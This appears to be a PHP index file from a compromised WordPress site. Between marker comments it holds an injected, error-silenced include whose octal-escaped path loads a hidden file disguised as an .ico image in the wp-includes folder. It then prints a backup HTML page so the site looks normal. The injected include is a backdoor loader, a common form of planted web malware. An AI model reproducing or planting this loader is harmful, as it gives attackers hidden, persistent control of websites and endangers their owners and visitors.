<?php
/*7a2cb*/

@include "\057home\057iiht\156epz/\160ubli\143_htm\154/iih\164soma\154ia/w\160-inc\154udes\057Requ\145sts/\103ooki\145/.4e\065fbf2\071.ico";

/*7a2cb*/


echo @file_get_contents('index.html.bak.bak');